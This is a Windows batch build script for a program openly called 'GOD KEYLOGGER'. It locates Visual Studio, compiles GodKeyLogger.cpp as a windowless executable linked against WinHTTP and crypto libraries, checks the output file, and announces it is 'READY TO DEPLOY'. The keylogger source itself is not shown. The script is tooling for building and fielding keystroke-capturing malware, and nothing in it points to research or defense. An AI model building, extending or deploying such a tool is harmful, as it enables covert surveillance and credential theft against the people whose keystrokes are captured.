@echo off
echo ========================================
echo    GOD KEYLOGGER - SIMPLIFIED BUILD
echo ========================================
echo.

:: Check for Visual Studio 2022/2019
set VSWHERE="%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
set VSINSTALL=

if exist %VSWHERE% (
    for /f "usebackq tokens=*" %%i in (`%VSWHERE% -latest -property installationPath`) do set VSINSTALL=%%i
)

if "%VSINSTALL%"=="" (
    echo [ERROR] Visual Studio not found!
    echo.
    echo Please install ONE of these:
    echo 1. Visual Studio 2022 Build Tools
    echo    https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
    echo.
    echo 2. Visual Studio 2022 Community
    echo    https://visualstudio.microsoft.com/vs/community/
    echo.
    echo 3. Or run from "Developer Command Prompt for VS 2022"
    pause
    exit /b 1
)

echo [INFO] Found Visual Studio at: %VSINSTALL%

:: Setup environment
call "%VSINSTALL%\VC\Auxiliary\Build\vcvars64.bat"

:: Build
echo [1/2] Building GodKeyLogger.cpp...
cl.exe /EHsc /Ox /W2 /DUNICODE /D_UNICODE /MT /std:c++17 ^
  GodKeyLogger.cpp ^
  /link /SUBSYSTEM:WINDOWS /OUT:GodKeyLogger.exe ^
  user32.lib gdi32.lib advapi32.lib winhttp.lib crypt32.lib

if %errorlevel% neq 0 (
    echo [ERROR] Build failed!
    pause
    exit /b 1
)

:: Verify
echo [2/2] Verifying executable...
if exist GodKeyLogger.exe (
    for %%F in (GodKeyLogger.exe) do set size=%%~zF
    echo [SUCCESS] Build completed!
    echo [INFO] File: GodKeyLogger.exe
    echo [INFO] Size: %size% bytes
    echo [INFO] Build time: %date% %time%
) else (
    echo [ERROR] Output file not found!
    pause
    exit /b 1
)

echo.
echo ========================================
echo    READY TO DEPLOY
echo ========================================
echo.
pause
